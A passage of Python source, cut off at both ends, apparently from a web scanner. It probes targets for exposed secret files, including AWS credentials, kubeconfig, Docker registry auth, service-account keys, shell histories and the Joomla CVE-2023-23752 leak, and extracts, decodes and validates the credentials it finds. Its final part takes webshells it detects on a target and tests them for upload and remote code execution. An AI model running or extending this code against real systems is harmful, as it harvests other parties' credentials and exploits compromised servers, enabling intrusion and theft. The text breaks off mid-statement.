    # ── Joomla CVE-2023-23752 — unauthenticated API credential/config leak ────
    elif status == 200 and '/api/index.php/v1/' in path:
        try:
            import json as _json
            jdata = _json.loads(content)
            if 'data' in jdata and isinstance(jdata['data'], list) and 'users' in path:
                users = [{'id': u.get('id'), 'name': u.get('name'), 'email': u.get('email')}
                         for u in jdata['data'][:10] if isinstance(u, dict)]
                if users:
                    findings.append({
                        'type': 'joomla', 'url': base_url, 'path': path,
                        'data': {'note': 'CVE-2023-23752 — Joomla user list exposed',
                                 'users': str(users), 'url': full_url, 'validated': True},
                    })
            elif 'data' in jdata and 'config' in path:
                cfg = {}
                for item in (jdata.get('data') or []):
                    if isinstance(item, dict):
                        cfg[item.get('name', '')] = item.get('value', '')
                findings.append({
                    'type': 'joomla', 'url': base_url, 'path': path,
                    'data': {'note': 'CVE-2023-23752 — Joomla config leak',
                             'url': full_url, **cfg, 'validated': True},
                })
        except Exception:
            pass  # Joomla API accessible but no structured data — not actionable

    # ── Git repository exposure ────────────────────────────────────────────────
    elif status == 200 and '/.git/' in path:
        # HEAD alone is just a branch name — not actionable. Config with remote creds is.
        if 'config' in path and ('[core]' in content or '[remote' in content):
            info = extract_git_config(content)
            findings.append({
                'type': 'exposure', 'url': base_url, 'path': path,
                'data': {'note': 'Git config exposed — remote URL may contain credentials',
                         'url': full_url, **info},
            })

    # phpMyAdmin login page — dropped (no creds, brute-force is out of scope)

    # ── Backup archives and SQL dumps — report only when creds found ─────────
    elif status == 200 and any(path.endswith(ext) for ext in
                                ['.zip', '.tar.gz', '.sql', '.bak', '.gz']):
        if len(content) > 100:
            creds = scan_for_api_creds(content)
            if creds:
                ext = path.rsplit('.', 1)[-1]
                data = {'note': f'Backup/archive (.{ext}) — credentials found',
                        'url': full_url, 'size_bytes': len(content)}
                data.update(creds)
                findings.append({'type': 'exposure', 'url': base_url, 'path': path, 'data': data})

    # ── JavaScript bundle — scan for hardcoded API keys ───────────────────────
    elif status == 200 and path.endswith('.js') and len(content) > 500:
        creds = scan_for_api_creds(content)
        if creds:
            findings.append({
                'type': 'api_keys', 'url': base_url, 'path': path,
                'data': {'note': 'Hardcoded API keys found in JS bundle',
                         'url': full_url, **creds},
            })

    # ── App log files — only report when credentials found ───────────────────
    elif status == 200 and any(p in path for p in ['/var/log/', '/exception.log', '/system.log']):
        if len(content) > 100:
            creds = scan_for_api_creds(content)
            if creds:
                data = {'note': 'Application log — credentials found', 'url': full_url,
                        'size_bytes': len(content),
                        'preview': content[:400].replace('\n', ' | ')}
                data.update(creds)
                findings.append({'type': 'exposure', 'url': base_url, 'path': path, 'data': data})

    # ── Docker / DevOps — only report when credentials found ──────────────
    elif status == 200 and any(p in path for p in
                               ['/docker-compose.yml', '/docker-compose.yaml',
                                '/.dockerenv', '/.kube/config', '/docker-compose.override.yml']):
        creds = scan_for_api_creds(content)
        if creds:
            data = {'note': 'DevOps config — credentials found', 'url': full_url}
            data.update(creds)
            findings.append({'type': 'exposure', 'url': base_url, 'path': path, 'data': data})

    # ── .htpasswd — exposed Apache password file ──────────────────────────────
    elif status == 200 and '/.htpasswd' in path:
        if ':' in content and any(p in content for p in ['$apr1$', '$2y$', '$1$', ':{SHA}']):
            findings.append({
                'type': 'exposure', 'url': base_url, 'path': path,
                'data': {'note': '.htpasswd exposed — hashed credentials',
                         'url': full_url, 'preview': content[:400]},
            })

    # ── AWS credentials file ──────────────────────────────────────────────────
    elif status == 200 and ('/.aws/' in path or path in ('/.aws/credentials', '/.aws/config')):
        # Parse real AWS keys from INI format first
        aws_creds = extract_aws_credentials_file(content)
        if aws_creds:
            data = {'note': 'AWS credentials file exposed — real keys found', 'url': full_url}
            data.update(aws_creds)
            _validate_env_finding({
                'type': 'aws', 'url': base_url, 'path': path, 'data': data
            }, timeout)
            findings.append({'type': 'aws', 'url': base_url, 'path': path, 'data': data})

        # Scan for any non-AWS API keys in the same file and save under api_keys
        other = scan_for_api_creds(content) or {}
        if aws_creds:
            other.pop('AWS_Access_Key', None)   # already captured above
        if other:
            findings.append({
                'type': 'api_keys', 'url': base_url, 'path': path,
                'data': {'note': f'Credentials found in {path}', 'url': full_url, **other},
            })

        # If nothing structured, still flag the file exposure with a preview
        if not aws_creds and not other:
            if 'aws_access_key_id' in content.lower() or '[default]' in content:
                findings.append({
                    'type': 'exposure', 'url': base_url, 'path': path,
                    'data': {'note': 'AWS credentials file exposed — no valid keys extracted',
                             'url': full_url, 'preview': content[:400]},
                })

    # ── Credential / key files (service accounts, git-credentials, etc.) ──────
    elif status == 200 and any(p in path for p in
                                ['/.git-credentials', '/.netrc', '/.npmrc', '/.pypirc',
                                 '/credentials.json', '/service_account.json',
                                 '/service-account.json', '/client_secret.json',
                                 '/firebase.json', '/keyfile.json', '/gcloud.json']):
        creds = scan_for_api_creds(content)
        data  = {'note': f'Credential file exposed: {path}', 'url': full_url}
        if creds:
            data.update(creds)
        elif len(content) > 10:
            data['preview'] = content[:400]
        if creds or len(content) > 10:
            findings.append({'type': 'api_keys', 'url': base_url, 'path': path, 'data': data})

    # ── Shell history files (contain plaintext commands with credentials) ─────
    elif status == 200 and any(p in path for p in ['/.bash_history', '/.zsh_history']):
        if len(content) > 20:
            creds = scan_for_api_creds(content)
            data  = {'note': f'Shell history exposed: {path}', 'url': full_url,
                     'size_bytes': len(content), 'preview': content[:500]}
            if creds:
                data.update(creds)
            findings.append({'type': 'exposure', 'url': base_url, 'path': path, 'data': data})

    # ── ASP.NET config / appsettings (connection strings, API keys) ───────────
    elif status == 200 and any(p in path for p in
                                ['/web.config', '/appsettings.json',
                                 '/appsettings.Development.json', '/appsettings.Production.json',
                                 '/elmah.axd', '/trace.axd']):
        creds = scan_for_api_creds(content)
        data  = {'note': f'ASP.NET config/diagnostic exposed: {path}', 'url': full_url}
        if creds:
            data.update(creds)
        elif any(k in content for k in ['ConnectionString', 'connectionString',
                                         'Data Source', 'Password=', 'pwd=']):
            data['preview'] = content[:500]
            data['note']    = f'ASP.NET config with connection strings exposed: {path}'
        if creds or 'preview' in data:
            findings.append({'type': 'exposure', 'url': base_url, 'path': path, 'data': data})

    # ── Framework DB/secrets config files ─────────────────────────────────────
    elif status == 200 and any(p in path for p in
                                ['/config/database.php', '/config/database.yml',
                                 '/config/secrets.yml', '/config/credentials.yml',
                                 '/application/config/database.php',
                                 '/app/config/parameters.yml']):
        creds = scan_for_api_creds(content)
        data  = {'note': f'Framework config file exposed: {path}', 'url': full_url}
        if creds:
            data.update(creds)
        elif any(k in content for k in ['password', 'passwd', 'secret', 'database', 'DB_']):
            data['preview'] = content[:500]
        if creds or 'preview' in data:
            findings.append({'type': 'db', 'url': base_url, 'path': path, 'data': data})

    # ── CI/CD config files (may contain tokens as env vars) ───────────────────
    elif status == 200 and any(p in path for p in
                                ['/.travis.yml', '/.circleci/config.yml', '/Jenkinsfile']):
        creds = scan_for_api_creds(content)
        data  = {'note': f'CI/CD config exposed: {path}', 'url': full_url}
        if creds:
            data.update(creds)
            findings.append({'type': 'api_keys', 'url': base_url, 'path': path, 'data': data})
        elif len(content) > 50:
            data['preview'] = content[:400]
            findings.append({'type': 'exposure', 'url': base_url, 'path': path, 'data': data})

    # ── IaC state / Serverless config (Terraform, Serverless Framework) ────────
    elif status == 200 and any(p in path for p in
                                ['/terraform.tfstate', '/terraform.tfstate.backup',
                                 '/.terraform/terraform.tfstate',
                                 '/serverless.yml', '/serverless.yaml',
                                 '/.serverless/serverless-state.json']):
        # Content must structurally match the expected file — a catch-all returning
        # 200+HTML would otherwise trip this handler on every target.
        _iac_valid = False
        if 'terraform' in path:
            try:
                import json as _ij
                _tp = _ij.loads(content)
                _iac_valid = ('version' in _tp and
                              ('resources' in _tp or 'terraform_version' in _tp
                               or 'outputs' in _tp))
            except Exception:
                pass
        elif 'serverless' in path:
            if path.endswith('.json'):
                try:
                    import json as _sj
                    _sp = _sj.loads(content)
                    _iac_valid = 'service' in _sp or 'functions' in _sp
                except Exception:
                    pass
            else:
                _iac_valid = any(k in content for k in
                                 ['service:', 'functions:', 'provider:', 'runtime:'])
        if _iac_valid:
            creds = scan_for_api_creds(content)
            data  = {'note': f'IaC config exposed: {path}', 'url': full_url}
            if creds:
                data.update(creds)
            elif any(k in content for k in ['aws_access_key', 'secret_key', 'password',
                                             'token', 'AccountId', 'StackId']):
                data['preview'] = content[:600]
            if creds or 'preview' in data:
                ftype = 'aws' if creds and 'AWS_Access_Key' in repr(creds) else 'exposure'
                findings.append({'type': ftype, 'url': base_url, 'path': path, 'data': data})

    # ── Docker registry auth (.docker/config.json) ────────────────────────────
    elif status == 200 and '/.docker/config.json' in path:
        import base64 as _b64
        import json as _dj
        data = {'note': f'Docker config exposed: {path}', 'url': full_url}
        try:
            cfg   = _dj.loads(content)
            auths = {}
            for registry, rdata in cfg.get('auths', {}).items():
                enc = rdata.get('auth', '')
                if enc:
                    decoded     = _b64.b64decode(enc + '==').decode('utf-8', 'replace')
                    user, _, pw = decoded.partition(':')
                    auths[registry] = {'user': user, 'pass': pw}
            if auths:
                data['docker_auths'] = auths
                data['note']         = 'Docker registry credentials decoded from config.json'
                data['validated']    = True
                findings.append({'type': 'api_keys', 'url': base_url,
                                 'path': path, 'data': data})
            elif 'credstore' in cfg or 'credHelpers' in cfg:
                # Valid Docker config structure even without inline auth tokens
                data['preview'] = content[:400]
                findings.append({'type': 'exposure', 'url': base_url,
                                 'path': path, 'data': data})
            # Parsed as JSON but no Docker keys found — not a real config.json; skip.
        except Exception:
            # JSON parse failed — response is HTML / redirect / error page; skip.
            pass

    # ── Rails master key / encrypted credentials ──────────────────────────────
    elif status == 200 and any(p in path for p in
                                ['/config/master.key', '/config/credentials.yml.enc']):
        stripped = content.strip()
        if '/config/master.key' in path:
            # A Rails master key is exactly 32 random bytes rendered as 64 lowercase
            # hex characters — nothing else.  Any HTML page, JSON error, or redirect
            # body will fail this check and produce no finding.
            if re.fullmatch(r'[0-9a-f]{64}', stripped):
                findings.append({
                    'type': 'api_keys', 'url': base_url, 'path': path,
                    'data': {
                        'note':      'Rails master.key exposed — decrypts credentials.yml.enc',
                        'url':       full_url,
                        'preview':   stripped,
                        'validated': True,
                    },
                })
        else:
            # credentials.yml.enc is encrypted binary — it will never look like HTML,
            # JSON, or XML.  Reject anything that resembles a web page.
            if ('<html' not in cl and '<body' not in cl and '<!doctype' not in cl
                    and not stripped.startswith('{') and len(stripped) > 20):
                findings.append({
                    'type': 'api_keys', 'url': base_url, 'path': path,
                    'data': {
                        'note':      'Rails credentials.yml.enc exposed — encrypted secrets file',
                        'url':       full_url,
                        'preview':   repr(stripped[:80]),
                        'validated': True,
                    },
                })

    # ── Cloud deploy configs (Vercel/Netlify/app.yaml) ────────────────────────
    elif status == 200 and any(p in path for p in
                                ['/vercel.json', '/netlify.toml', '/app.yaml', '/app.yml',
                                 '/.platform/env', '/docker-compose.override.yml']):
        # Validate content matches the expected format — not just any 200 response.
        _dc_valid = False
        if 'vercel.json' in path:
            try:
                import json as _vj
                _vp = _vj.loads(content)
                _dc_valid = any(k in _vp for k in [
                    'builds', 'routes', 'functions', 'env', 'rewrites',
                    'redirects', 'headers', 'crons', 'framework',
                ])
            except Exception:
                pass
        elif 'netlify.toml' in path:
            _dc_valid = any(k in content for k in
                            ['[build]', '[[plugins]]', '[context.', '[dev]', 'command ='])
        elif 'app.yaml' in path or 'app.yml' in path:
            _dc_valid = any(k in content for k in
                            ['runtime:', 'service:', 'env_variables:', 'handlers:', 'entrypoint:'])
        elif '.platform/env' in path:
            _dc_valid = '=' in content and '<html' not in cl
        elif 'docker-compose.override' in path:
            _dc_valid = any(k in content for k in ['services:', 'version:', 'networks:'])
        if _dc_valid:
            creds = scan_for_api_creds(content)
            data  = {'note': f'Deploy config exposed: {path}', 'url': full_url}
            if creds:
                data.update(creds)
            elif any(k in content for k in
                     ['API_KEY', 'SECRET', 'TOKEN', 'PASSWORD', 'DATABASE_URL']):
                data['preview'] = content[:500]
            if creds or 'preview' in data:
                findings.append({'type': 'api_keys' if creds else 'exposure',
                                 'url': base_url, 'path': path, 'data': data})

    # ── GitHub Actions workflows (hardcoded secrets in CI steps) ─────────────
    elif status == 200 and '/.github/workflows/' in path:
        # Must contain valid GitHub Actions YAML structure — not just any response body.
        if any(k in content for k in ['on:', 'jobs:', 'runs-on:', 'uses:', 'steps:']):
            creds = scan_for_api_creds(content)
            data  = {'note': f'CI/CD workflow exposed: {path}', 'url': full_url}
            if creds:
                data.update(creds)
                findings.append({'type': 'api_keys', 'url': base_url,
                                 'path': path, 'data': data})
            elif any(k in content for k in
                     ['SECRET', 'TOKEN', 'PASSWORD', 'API_KEY', 'env:', 'run:']):
                data['preview'] = content[:500]
                findings.append({'type': 'exposure', 'url': base_url,
                                 'path': path, 'data': data})

    # ── Package manager auth tokens (.gem/credentials, composer.auth.json) ────
    elif status == 200 and any(p in path for p in
                                ['/.gem/credentials', '/composer.auth.json']):
        _pm_valid = False
        if '.gem/credentials' in path:
            # Ruby Gems credentials YAML — must contain the gem api key marker
            _pm_valid = (any(k in content for k in [':rubygems_api_key:', 'rubygems.org'])
                         and '<html' not in cl)
        elif 'composer.auth.json' in path:
            try:
                import json as _cj
                _cp = _cj.loads(content)
                _pm_valid = any(k in _cp for k in
                                ['http-basic', 'bearer', 'github-oauth',
                                 'gitlab-token', 'bitbucket-oauth'])
            except Exception:
                pass
        if _pm_valid:
            creds = scan_for_api_creds(content)
            data  = {'note': f'Package manager auth exposed: {path}', 'url': full_url}
            if creds:
                data.update(creds)
            else:
                data['preview'] = content[:400]
            findings.append({'type': 'api_keys', 'url': base_url,
                             'path': path, 'data': data})

    # ── mongo-express unauthorized MongoDB admin UI ────────────────────────────
    elif status == 200 and any(p in path for p in ['/mongo-express', '/mongo-express/']):
        if any(k in cl for k in ['mongo', 'mongodb', 'database', 'collection',
                                  'createcollection', 'document']):
            findings.append({
                'type': 'exposure', 'url': base_url, 'path': path,
                'data': {
                    'note':      'mongo-express MongoDB admin UI — unauthenticated access',
                    'url':       full_url,
                    'preview':   content[:300],
                    'validated': True,
                },
            })

    # ── Docker daemon ping (exposed Docker socket via HTTP proxy) ─────────────
    elif status == 200 and path == '/_ping':
        # Docker daemon returns exactly the two-character string "OK".
        # Reject anything longer (HTML page, JSON error, redirect body).
        if content.strip() == 'OK' and '<html' not in cl:
            findings.append({
                'type': 'exposure', 'url': base_url, 'path': path,
                'data': {
                    'note':      'Docker daemon HTTP API exposed (/_ping responded OK)',
                    'url':       full_url,
                    'validated': True,
                },
            })

    # ── Cloud IMDS / metadata endpoint (direct exposure via proxy misconfiguration)
    elif status == 200 and any(p in path for p in [
            '/latest/meta-data/', '/computeMetadata/v1/', '/metadata/v1/',
            '/latest/dynamic/', '/latest/user-data',
            '/metadata/instance', '/metadata/identity/']):
        if any(k in content for k in [
                'ami-id', 'instance-id', 'iam/security-credentials',
                'access_token', 'instanceType', 'project-id',
                'expiresOn', 'clientId']) and '<html' not in cl:
            findings.append({
                'type': 'exposure', 'url': base_url, 'path': path,
                'data': {
                    'note':      'Cloud IMDS metadata accessible — SSRF or direct proxy misconfiguration. '
                                 'IAM credentials, instance identity, or tokens may be present.',
                    'url':       full_url,
                    'preview':   content[:600],
                    'validated': True,
                },
            })

    # ── Kubernetes API — unauthenticated cluster access ───────────────────────
    elif status == 200 and any(p in path for p in [
            '/api/v1/secrets', '/api/v1/configmaps', '/api/v1/serviceaccounts',
            '/api/v1/nodes', '/apis/apps/v1/', '/apis/rbac.authorization.k8s.io/']):
        try:
            import json as _kj
            _kp = _kj.loads(content)
            if _kp.get('kind') in ('SecretList', 'ConfigMapList', 'NodeList',
                                    'ServiceAccountList', 'DeploymentList', 'ClusterRoleList'):
                count = len(_kp.get('items', []))
                findings.append({
                    'type': 'exposure', 'url': base_url, 'path': path,
                    'data': {
                        'note':      f'Kubernetes API unauthenticated — {_kp["kind"]} returned {count} items.',
                        'url':       full_url,
                        'k8s_kind':  _kp['kind'],
                        'item_count': count,
                        'validated': True,
                    },
                })
        except Exception:
            pass

    # ── .kube/config — kubeconfig with cluster credentials ────────────────────
    elif status == 200 and '/.kube/config' in path:
        if all(k in content for k in ['clusters:', 'users:', 'contexts:']) and '<html' not in cl:
            creds = scan_for_api_creds(content)
            data  = {
                'note':      'kubeconfig exposed — cluster addresses and credentials readable.',
                'url':       full_url,
                'preview':   content[:600],
                'validated': True,
            }
            if creds:
                data.update(creds)
            findings.append({'type': 'api_keys', 'url': base_url, 'path': path, 'data': data})

    # ── Shell history — passwords and tokens in command history ──────────────
    elif status == 200 and any(p in path for p in [
            '/.bash_history', '/.zsh_history', '/.ash_history',
            '/.sh_history', '/.mysql_history', '/.psql_history', '/.python_history']):
        if '<html' not in cl and '<body' not in cl and len(content.strip()) > 10:
            creds = scan_for_api_creds(content)
            # Check for common credential patterns in history
            sensitive = any(k in content for k in [
                'password', 'passwd', 'secret', 'token', 'api_key',
                'mysql -u', 'psql -U', 'aws ', 'curl -H', 'Authorization:',
                'export ', 'AKIA', 'ssh ', 'sftp ', 'ftp ',
            ])
            if creds or sensitive:
                data = {
                    'note':    f'Shell history exposed: {path} — credentials / commands visible.',
                    'url':     full_url,
                    'preview': content[:600],
                }
                if creds:
                    data.update(creds)
                    data['validated'] = True
                findings.append({
                    'type': 'api_keys' if creds else 'exposure',
                    'url': base_url, 'path': path, 'data': data,
                })

    # ── .npmrc / .pypirc — package registry auth ─────────────────────────────
    elif status == 200 and any(p in path for p in ['/.npmrc', '/.pypirc']):
        _pm_valid = False
        if '.npmrc' in path:
            _pm_valid = ('_authToken' in content or '//registry.npmjs.org' in content
                         or '//npm.pkg.github.com' in content) and '<html' not in cl
        elif '.pypirc' in path:
            _pm_valid = '[pypi]' in content and 'password' in cl and '<html' not in cl
        if _pm_valid:
            creds = scan_for_api_creds(content)
            data  = {'note': f'Package registry auth exposed: {path}', 'url': full_url,
                     'preview': content[:400]}
            if creds:
                data.update(creds)
                data['validated'] = True
            findings.append({'type': 'api_keys', 'url': base_url, 'path': path, 'data': data})

    # ── SQL dumps ─────────────────────────────────────────────────────────────
    elif status == 200 and any(path.endswith(ext) for ext in
                                ['.sql', '.sql.gz', '.sqlite', '.sqlite3', '.db']):
        if any(k in content for k in [
                '-- MySQL dump', '-- MariaDB dump', 'CREATE TABLE',
                'INSERT INTO', 'PRAGMA', 'BEGIN TRANSACTION']) and '<html' not in cl:
            creds = scan_for_api_creds(content)
            data  = {
                'note':    f'Database dump exposed: {path}',
                'url':     full_url,
                'preview': content[:800],
            }
            if creds:
                data.update(creds)
            findings.append({
                'type': 'db' if creds else 'exposure',
                'url': base_url, 'path': path, 'data': data,
            })

    # ── Firebase init.json — project config / API key ────────────────────────
    elif status == 200 and '/__/firebase/init.json' in path:
        try:
            import json as _fj
            _fp = _fj.loads(content)
            if 'apiKey' in _fp or 'projectId' in _fp or 'databaseURL' in _fp:
                findings.append({
                    'type': 'api_keys', 'url': base_url, 'path': path,
                    'data': {
                        'note':      'Firebase project config exposed — API key and project ID readable.',
                        'url':       full_url,
                        'apiKey':    _fp.get('apiKey', ''),
                        'projectId': _fp.get('projectId', ''),
                        'dbURL':     _fp.get('databaseURL', ''),
                        'validated': True,
                    },
                })
        except Exception:
            pass

    # Prometheus metrics — internal metrics only, no credentials or execution. Dropped.

    # ── Airflow API — DAG / connection / variable exposure ────────────────────
    elif status == 200 and any(p in path for p in [
            '/api/v1/dags', '/api/v1/connections', '/api/v1/variables', '/api/v1/pools']):
        try:
            import json as _aj
            _ap = _aj.loads(content)
            if isinstance(_ap, dict) and any(k in _ap for k in
                                              ['dags', 'connections', 'variables', 'pools',
                                               'total_entries']):
                count = _ap.get('total_entries', len(_ap.get(list(_ap)[0], [])))
                findings.append({
                    'type': 'exposure', 'url': base_url, 'path': path,
                    'data': {
                        'note':    f'Apache Airflow API unauthenticated — {path} ({count} items).',
                        'url':     full_url,
                        'preview': content[:500],
                        'validated': True,
                    },
                })
        except Exception:
            pass

    # ── Portainer API — Docker environment access ─────────────────────────────
    elif status == 200 and any(p in path for p in ['/api/endpoints', '/api/status']):
        try:
            import json as _pj
            _pp = _pj.loads(content)
            if isinstance(_pp, (list, dict)):
                findings.append({
                    'type': 'exposure', 'url': base_url, 'path': path,
                    'data': {
                        'note':    'Portainer API accessible without auth — Docker environments exposed.',
                        'url':     full_url,
                        'preview': content[:400],
                        'validated': True,
                    },
                })
        except Exception:
            pass

    # ── RabbitMQ management — queue/connection visibility ────────────────────
    elif status == 200 and any(p in path for p in ['/api/overview', '/api/queues', '/api/nodes']):
        try:
            import json as _rj
            _rp = _rj.loads(content)
            if any(k in _rp for k in ['rabbitmq_version', 'queue_totals', 'object_totals',
                                        'name', 'messages']):
                findings.append({
                    'type': 'exposure', 'url': base_url, 'path': path,
                    'data': {
                        'note':    'RabbitMQ management API exposed — queue/connection metadata readable.',
                        'url':     full_url,
                        'preview': content[:400],
                        'validated': True,
                    },
                })
        except Exception:
            pass

    # ── Grafana API — datasource credentials ─────────────────────────────────
    elif status == 200 and any(p in path for p in [
            '/api/datasources', '/grafana/api/datasources',
            '/api/org/users', '/grafana/api/org/users', '/grafana/api/admin/users']):
        try:
            import json as _gj
            _gp = _gj.loads(content)
            if isinstance(_gp, list) and len(_gp) > 0:
                findings.append({
                    'type': 'exposure', 'url': base_url, 'path': path,
                    'data': {
                        'note':    f'Grafana API unauthenticated — {len(_gp)} item(s) returned.',
                        'url':     full_url,
                        'preview': content[:500],
                        'validated': True,
                    },
                })
        except Exception:
            pass

    # ── GCP service account key ───────────────────────────────────────────────
    elif status == 200 and any(p in path for p in [
            '/service_account.json', '/credentials.json', '/gcp_credentials.json',
            '/google_credentials.json', '/serviceaccount.json']):
        try:
            import json as _scj
            _scp = _scj.loads(content)
            if _scp.get('type') == 'service_account' and 'private_key' in _scp:
                findings.append({
                    'type': 'api_keys', 'url': base_url, 'path': path,
                    'data': {
                        'note':           'GCP service account key file exposed — full API access.',
                        'url':            full_url,
                        'project_id':     _scp.get('project_id', ''),
                        'client_email':   _scp.get('client_email', ''),
                        'private_key_id': _scp.get('private_key_id', '')[:20] + '...',
                        'validated':      True,
                    },
                })
        except Exception:
            pass

    # ── GraphQL IDE (unauthenticated — allows schema introspection) ───────────
    elif status == 200 and any(p in path for p in ['/graphiql', '/graphql']):
        if any(k in cl for k in ['graphiql', 'graphql', '__schema', 'introspection']):
            findings.append({
                'type': 'exposure', 'url': base_url, 'path': path,
                'data': {'note': 'GraphQL endpoint exposed — schema introspection possible',
                         'url': full_url},
            })

    # ── Adminer database management panel ────────────────────────────────────
    elif status == 200 and any(p in path.lower() for p in
                                ['/adminer.php', '/adminer/', '/dbadmin/']):
        if any(k in cl for k in ['adminer', 'login', 'database', 'server']):
            findings.append({
                'type': 'exposure', 'url': base_url, 'path': path,
                'data': {'note': 'Adminer database panel detected', 'url': full_url},
            })

    # ── phpinfo / server info pages ───────────────────────────────────────────
    elif status == 200 and any(p in path for p in ['/phpinfo.php', '/info.php', '/test.php']):
        if 'php version' in cl or 'phpinfo()' in cl or 'php_uname' in cl:
            version = detect_php_version(content)
            findings.append({
                'type': 'exposure', 'url': base_url, 'path': path,
                'data': {'note': 'PHP info page exposed', 'url': full_url,
                         'php_version': version},
            })

    # ── Laravel framework components (unhandled paths) ────────────────────────
    elif status == 200 and any(p in path for p in
                                ['/artisan', '/log-viewer', '/pulse', '/_debugbar',
                                 '/nova', '/clockwork', '/storage/logs']):
        labels = {
            '/artisan':      'Laravel Artisan console accessible',
            '/log-viewer':   'Laravel Log Viewer exposed',
            '/pulse':        'Laravel Pulse dashboard exposed',
            '/_debugbar':    'Laravel DebugBar exposed — internal request data visible',
            '/nova':         'Laravel Nova admin panel accessible',
            '/clockwork':    'Laravel Clockwork profiler exposed',
            '/storage/logs': 'Laravel storage/logs directory accessible',
        }
        note = next((v for k, v in labels.items() if k in path), 'Laravel component exposed')
        findings.append({
            'type': 'laravel', 'url': base_url, 'path': path,
            'data': {'note': note, 'url': full_url},
        })

    # ── Grafana / monitoring panels ───────────────────────────────────────────
    elif status == 200 and any(p in path for p in
                                ['/grafana', '/nagios', '/zabbix', '/portainer', '/monitoring']):
        panels = {'grafana': 'Grafana', 'nagios': 'Nagios', 'zabbix': 'Zabbix',
                  'portainer': 'Portainer', 'monitoring': 'Monitoring panel'}
        label = next((v for k, v in panels.items() if k in path.lower()), 'Monitoring panel')
        known = {'grafana': ['grafana', 'dashboard'], 'nagios': ['nagios', 'monitor'],
                 'zabbix': ['zabbix'], 'portainer': ['portainer', 'docker']}
        kws   = next((v for k, v in known.items() if k in path.lower()), [label.lower()])
        if any(k in cl for k in kws):
            creds = scan_for_api_creds(content)
            data  = {'note': f'{label} panel detected', 'url': full_url}
            if creds:
                data.update(creds)
            findings.append({'type': 'exposure', 'url': base_url, 'path': path, 'data': data})

    # ── GitLab API / admin ────────────────────────────────────────────────────
    elif status == 200 and any(p in path for p in ['/-/admin', '/-/metrics', '/api/v4/']):
        if any(k in cl for k in ['gitlab', '"id"', '"name"', 'version', 'metrics']):
            creds = scan_for_api_creds(content)
            data  = {'note': f'GitLab endpoint accessible: {path}', 'url': full_url,
                     'preview': content[:300]}
            if creds:
                data.update(creds)
            findings.append({'type': 'exposure', 'url': base_url, 'path': path, 'data': data})

    # ── Kubernetes API ────────────────────────────────────────────────────────
    elif status == 200 and any(p in path for p in ['/api/v1/namespaces', '/api/v1/pods']):
        if any(k in cl for k in ['namespace', 'pods', 'kind', 'apiversion']):
            findings.append({
                'type': 'exposure', 'url': base_url, 'path': path,
                'data': {'note': 'Kubernetes API exposed — unauthenticated access',
                         'url': full_url, 'preview': content[:400]},
            })

    # ── Apache Solr ───────────────────────────────────────────────────────────
    elif status == 200 and '/solr/' in path:
        if any(k in cl for k in ['solr', 'lucene', '"status"', 'numFound']):
            findings.append({
                'type': 'exposure', 'url': base_url, 'path': path,
                'data': {'note': 'Apache Solr admin exposed', 'url': full_url,
                         'preview': content[:300]},
            })

    # ── Apache / Nginx server status ──────────────────────────────────────────
    elif status == 200 and any(p in path for p in
                                ['/server-status', '/server-info', '/nginx_status', '/stub_status']):
        if any(k in cl for k in ['server version', 'total accesses', 'active connections',
                                   'requests/sec', 'apache', 'nginx']):
            findings.append({
                'type': 'exposure', 'url': base_url, 'path': path,
                'data': {'note': 'Web server status page exposed — reveals server info',
                         'url': full_url, 'preview': content[:400]},
            })

    # ── Drupal ────────────────────────────────────────────────────────────────
    elif status == 200 and any(p in path for p in
                                ['/core/install.php', '/CHANGELOG.txt',
                                 '/sites/default/settings.php.bak',
                                 '/sites/default/settings.local.php']):
        if any(k in cl for k in ['drupal', 'database', 'settings', 'install']):
            creds = scan_for_api_creds(content)
            data  = {'note': f'Drupal file exposed: {path}', 'url': full_url}
            if creds:
                data.update(creds)
            elif 'settings' in path:
                data['preview'] = content[:400]
            findings.append({'type': 'exposure', 'url': base_url, 'path': path, 'data': data})

    # ── Adobe ColdFusion ──────────────────────────────────────────────────────
    elif status in (200, 302) and '/CFIDE/' in path:
        if any(k in cl for k in ['coldfusion', 'cfide', 'adobe', 'cfm']):
            findings.append({
                'type': 'exposure', 'url': base_url, 'path': path,
                'data': {'note': 'Adobe ColdFusion admin detected', 'url': full_url},
            })

    # ── Ollama (AI model API) ─────────────────────────────────────────────────
    elif status == 200 and any(p in path for p in ['/api/tags', '/api/show']):
        if any(k in cl for k in ['models', '"name"', 'ollama', 'llama', 'mistral']):
            findings.append({
                'type': 'exposure', 'url': base_url, 'path': path,
                'data': {'note': 'Ollama AI API exposed — unauthenticated model access',
                         'url': full_url, 'preview': content[:400]},
            })

    # ── Magento setup / installer ─────────────────────────────────────────────
    elif status == 200 and any(p in path for p in ['/setup/', '/index.php/downloader/', '/mage']):
        if any(k in cl for k in ['magento', 'mage', 'installer', 'setup', 'downloader']):
            findings.append({
                'type': 'exposure', 'url': base_url, 'path': path,
                'data': {'note': f'Magento setup/installer accessible: {path}',
                         'url': full_url},
            })

    # ── Joomla component / language paths ─────────────────────────────────────
    elif status == 200 and any(p in path for p in
                                ['/components/com_', '/administrator/manifests/',
                                 '/language/en-GB/', '/plugins/system/']):
        if any(k in cl for k in ['joomla', 'xml', 'version', 'component']):
            version = detect_joomla_version(content)
            findings.append({
                'type': 'joomla', 'url': base_url, 'path': path,
                'data': {'note': f'Joomla component/manifest accessible',
                         'version': version, 'url': full_url},
            })

    # ── SVN / version control metadata ───────────────────────────────────────
    elif status == 200 and any(p in path for p in ['/.svn/', '/.hg/', '/.bzr/']):
        findings.append({
            'type': 'exposure', 'url': base_url, 'path': path,
            'data': {'note': f'VCS metadata exposed: {path}', 'url': full_url,
                     'preview': content[:300]},
        })

    # ── Supplemental: webshell scan — only on PHP-like content or paths ──────
    # Skipping JSON/JS/CSS/plain-text responses eliminates 95%+ of useless
    # regex work; webshell patterns are PHP-specific anyway.
    _is_php_candidate = (
        '.php' in path.lower()
        or '<?php' in content
        or 'eval(' in content
        or content.lstrip().startswith('<?')
    )
    if status == 200 and len(content) > 10 and _is_php_candidate:
        indicators = detect_webshell(content)
        if indicators and not any(f['type'] == 'shell' for f in findings):
            validated   = _validate_shell(full_url, session, timeout)
            upload_info = test_shell_upload(full_url, session, timeout) if validated else None
            rce_write   = _rce_write_probe(full_url, session, timeout) if validated else None
            up_exec     = upload_info.get('exec_confirmed', False) if upload_info else False
            up_url      = upload_info.get('upload_content_url', '') if upload_info else ''
            rce_written = bool(rce_write)
            final_val   = True if (up_exec or rce_written) else (None if validated else False)
            supp_data = {
                'note':               ('Webshell — upload/write EXEC confirmed' if (up_exec or rce_written)
                                       else ('Webshell ACCESSIBLE — RCE echo confirmed, exec blocked'
